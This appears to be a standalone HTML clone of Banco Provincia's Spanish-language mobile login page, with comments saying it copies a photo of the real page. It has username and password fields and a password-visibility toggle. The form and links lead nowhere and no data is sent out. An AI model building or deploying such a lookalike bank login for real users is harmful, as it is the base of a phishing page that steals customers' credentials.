<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Banco Provincia</title>
<!-- Iconos -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
  :root {
    --verde-banco: #007a2b;
    --turquesa-banco: #2ebcb5;
    --texto-gris: #333333;
    --placeholder-color: #aaaaaa;
    --boton-color: #3c3c3c;
    --borde-input: #dddddd;
    --radio-boton: 4px; /* La foto muestra esquinas casi rectas */
    --header-height: 110px;
  }

  * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
  }

  body {
    font-family: 'Roboto', 'Segoe UI', sans-serif;
    background-color: #e8ecf0;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
  }

  .mobile-wrapper {
    width: 100%;
    max-width: 400px;
    background-color: #ffffff;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    position: relative;
    box-shadow: 0 0 20px rgba(0,0,0,0.1);
  }

  @media (min-width: 401px) {
    .mobile-wrapper {
      height: 95vh;
      border-radius: 12px;
      overflow: hidden;
      margin-top: 20px;
      margin-bottom: 20px;
    }
  }

  /* HEADER EXACTO A LA IMAGEN */
  header {
    background: linear-gradient(90deg, var(--verde-banco) 0%, var(--turquesa-banco) 100%);
    height: var(--header-height);
    padding: 20px 20px 10px 20px;
    text-align: center;
    color: white;
    display: flex;
    flex-direction: column;
    justify-content: center;
  }

  .logo-area {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 12px;
    margin-bottom: 15px;
  }

  .logo-svg {
    width: 36px;
    height: 36px;
  }

  h1 {
    font-size: 1.2rem;
    font-weight: 600;
  }

  .subtitulo {
    font-size: 1.1rem;
    font-weight: 600;
    opacity: 0.95;
  }

  /* FORMULARIO */
  form {
    padding: 30px 25px;
    flex-grow: 1;
    display: flex;
    flex-direction: column;
  }

  .input-group {
    margin-bottom: 25px;
    position: relative;
  }

  label {
    display: block;
    margin-bottom: 8px;
    font-weight: 600;
    font-size: 0.95rem;
    color: var(--texto-gris);
  }

  input[type="text"],
  input[type="password"] {
    width: 100%;
    padding: 12px 10px;
    font-size: 1rem;
    border: none;
    border-bottom: 2px solid var(--borde-input);
    background: transparent;
    color: var(--texto-gris);
    outline: none;
    transition: border-color 0.3s;
  }

  input:focus {
    border-bottom-color: var(--verde-banco);
  }

  input::placeholder {
    color: var(--placeholder-color);
  }

  /* BOTÓN DEL OJO */
  .toggle-pass-btn {
    position: absolute;
    right: 10px;
    top: 38px; 
    background: none;
    border: none;
    color: var(--verde-banco);
    cursor: pointer;
    font-size: 1.2rem;
    padding: 5px;
  }

  /* BOTÓN INGRESAR */
  .btn-ingresar {
    width: 100%;
    padding: 14px;
    background-color: var(--boton-color);
    color: white;
    border: none;
    border-radius: var(--radio-boton);
    font-size: 1rem;
    font-weight: 600;
    cursor: pointer;
    margin-top: 10px;
    transition: background-color 0.2s;
  }

  .btn-ingresar:hover {
    background-color: #555555;
  }

  /* LINKS INFERIORES */
  .links-container {
    padding: 20px 25px;
    display: flex;
    flex-direction: column;
    gap: 15px;
    border-top: 1px solid #eeeeee;
    background-color: #fafafa;
  }

  .link-item {
    text-decoration: underline;
    color: var(--verde-banco);
    font-size: 0.9rem;
    text-align: left;
    line-height: 1.4;
  }

  .link-item:hover {
    color: #005a20;
  }
  
  .required {
    color: red;
  }
</style>
</head>
<body>

<div class="mobile-wrapper">
  <header>
    <div class="logo-area">
      <!-- SVG Logo Banco Provincia -->
      <svg class="logo-svg" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 2L2 7V17L12 22L22 17V7L12 2Z" stroke="white" stroke-width="2"/>
        <path d="M12 22V12" stroke="white" stroke-width="2"/>
        <path d="M2 7L12 12L22 7" stroke="white" stroke-width="2"/>
      </svg>
      <h1>Banco Provincia</h1>
    </div>
    <div class="subtitulo">Iniciá sesión</div>
  </header>

  <form action="#" method="POST">
    
    <div class="input-group">
      <label for="usuario">Tu usuario <span class="required">*</span></label>
      <input type="text" id="usuario" name="username" placeholder="Ingresá tu nombre de usuario" required>
    </div>

    <div class="input-group">
      <label for="clave">Tu clave <span class="required">*</span></label>
      <input type="password" id="clave" name="password" placeholder="Ingresá tu clave" required>
      <button type="button" class="toggle-pass-btn" onclick="togglePassword()">
        <i class="fa-regular fa-eye"></i>
      </button>
    </div>

    <button type="submit" class="btn-ingresar">ingresar</button>
  </form>

  <div class="links-container">
    <a href="#" class="link-item">¿No sos BIP? Registrate</a>
    <a href="#" class="link-item">Bloqueé u olvidé mi usuario y/o clave</a>
    <a href="#" class="link-item">Conocé como hacerte usuario u operar</a>
    <a href="#" class="link-item">Recomendaciones de seguridad</a>
  </div>
</div>

<script>
  function togglePassword() {
    const passwordInput = document.getElementById('clave');
    const icon = document.querySelector('.toggle-pass-btn i');
    
    if (passwordInput.type === 'password') {
      passwordInput.type = 'text';
      icon.classList.remove('fa-eye');
      icon.classList.add('fa-eye-slash');
    } else {
      passwordInput.type = 'password';
      icon.classList.remove('fa-eye-slash');
      icon.classList.add('fa-eye');
    }
  }
</script>

</body>
</html>
